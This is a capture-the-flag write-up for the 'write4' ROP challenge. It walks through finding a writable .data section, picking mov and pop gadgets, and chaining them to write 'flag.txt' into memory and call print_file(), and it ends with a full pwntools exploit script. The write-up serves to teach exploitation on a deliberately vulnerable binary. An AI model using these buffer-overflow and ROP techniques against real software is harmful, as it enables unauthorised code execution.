# Write4
In this challenge, we are given a function to open arbitrary files (`print_file()`), with the goal of opening `flag.txt`. 
The difficult part is that the string `flag.txt` is nowhere to be found in the binary. 
We must thus use ROP to write the string to memory ourselves.

To solve this challenge, we must complete the following steps:
- Identify a memory location where we can write our string to.
- Write `flag.txt`.
- Put the pointer to our string in `rdi`.
- Call `print_file()`.

## Identifying suitable memory
Before we can write our string to memory, we must first identify some memory that we can write to without breaking anything. We can use radare2 to get a view of the memory sections:
```
$ r2 write4 
[0x00400520]> iS
[Sections]

nth paddr        size vaddr       vsize perm type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- NULL
1   0x00000238   0x1c 0x00400238   0x1c -r-- PROGBITS    .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- NOTE        .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- NOTE        .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- GNU_HASH    .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- DYNSYM      .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- STRTAB      .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- GNU_VERSYM  .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- GNU_VERNEED .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- RELA        .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- RELA        .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x PROGBITS    .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x PROGBITS    .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x PROGBITS    .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x PROGBITS    .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- PROGBITS    .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- PROGBITS    .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- PROGBITS    .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
25  0x00001038   0x29 0x00000000   0x29 ---- PROGBITS    .comment
26  0x00001068  0x618 0x00000000  0x618 ---- SYMTAB      .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- STRTAB      .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- STRTAB      .shstrtab
```
Here we need to pick a segment with `rw`. Let's pick `.data` at  `0x601028` (`.got` and `.got.plt` could technically work, but is not as good of a choice as we might overwrite crucial memory. `.bss` could also be fine but only has room for 8 characters, so a null terminator won't fit after our string).

## Write to memory
Next we will go looking for a gadget that allows for writing to memory such as `mov [reg], reg`. This binary has two of such gadgets:
```
$ ropper -f write4 | grep mov

...
0x0000000000400629: mov dword ptr [rsi], edi; ret; 
...
0x0000000000400628: mov qword ptr [r14], r15; ret; 
...
```
Both of these gadgets could be used for this challenge. We will use the one at `0x400629`, but the other one would have arguably been better as it allows for writing 64 bits instead of 32.
With this gadget, we can write to a pointer in `rsi` with the contents of `rdi/edi`. We will thus also need gadgets to fill `rsi` and `rdi/edi`.
Using ropper we can again find gadgets for those as well:
```
0x0000000000400691: pop rsi; pop r15; ret;
0x0000000000400693: pop rdi; ret;
```
Note that our gadget for `rsi` also pops to `r15`. This means we will also need to provide some garbage value that will go into `r15`.
We can now write a function to write 4 bytes to a writable address using these gadgets as follows:
```
def write4bytes(writable_address, bytestr):
    pop_rsi_r15_gadget = 0x400691
    pop_rdi_gadget = 0x400693
    write_mov_gadget = 0x400629

    payload  = p64(pop_rsi_r15_gadget) # Load destination address into rsi
    payload += p64(writable_address)   # Pops write destination into rsi
    payload += p64(0x4141414141414141) # Garbage value for r15
    payload += p64(pop_rdi_gadget)     # Load 4 byte string into edi/rdi
    payload += p64(u32(bytestr))       # The 4 bytes to write
    payload += p64(write_mov_gadget)   # Trigger write
    return payload
```
We can use this function to write `flag.txt` to our writable address as follows (note that it also seem to work without supplying the null bytes):
```
writable_address = 0x601028 # in .data segment

# Stage 1, write "flag.txt" to writable_address
payload += write4bytes(writable_address  , b"flag")
payload += write4bytes(writable_address+4, b".txt")
payload += write4bytes(writable_address+8, b"\x00\x00\x00\x00") # Seems unnecessary for working exploit
```

## Write the memory address to `rdi`
To put the address of our written string into `rdi`, we can reuse the same gadget from before.
```
payload += p64(pop_rdi_gadget)
payload += p64(writable_address)
```

## Call `print_file()`
As the final step of our exploit, we simply need to call `print_file()`. We can do this by reusing the PLT trampoline trick from the previous challenge; taking the jump in the PLT to the function:
```
print_file_plt = 0x400510
payload += p64(print_file_plt)
```
The script for the complete exploit is thus as follows:

```
#!/usr/bin/env python3

from pwn import *
import subprocess


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


"""
notes:

"""

gdbscript = ""

breakpoints = [
    #    'breakrva 0xoffset',
    #"continue"
]

for s in breakpoints:
    gdbscript += s + "\n"


exe = "./write4"
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = 'info' # use DEBUG in args for debugging. LOG_LEVEL=warn/info/error for anything else

"""
if args.REMOTE:
    libc = ELF('./libc.so.6', checksec=False)
else:
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
"""

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Writes a dword. Alternatively, a gadget to write a qword can be used.
def write4bytes(writable_address, bytestr):
    pop_rsi_r15_gadget = 0x400691
    pop_rdi_gadget = 0x400693
    write_mov_gadget = 0x400629

    payload  = p64(pop_rsi_r15_gadget) # Load destination address into rsi
    payload += p64(writable_address)   # Pops write destination into rsi
    payload += p64(0x4141414141414141) # Garbage value for r15
    payload += p64(pop_rdi_gadget)     # Load 4 byte string into edi/rdi
    payload += p64(u32(bytestr))       # The 4 bytes to write
    payload += p64(write_mov_gadget)   # Trigger write
    return payload

io = start()

writable_address = 0x601028 # in .data segment
pop_rdi_gadget   = 0x400693
print_file_plt   = 0x400510

payload = b"A" * 40

# Stage 1, write "flag.txt" to writable_address
payload += write4bytes(writable_address  , b"flag")
payload += write4bytes(writable_address+4, b".txt")
payload += write4bytes(writable_address+8, b"\x00\x00\x00\x00") # Seems unnecessary for working exploit

# Stage 2, put writable_address in rdi and call print_file()
payload += p64(pop_rdi_gadget)
payload += p64(writable_address)
payload += p64(print_file_plt)


io.sendlineafter(b">", payload)
io.interactive()
...
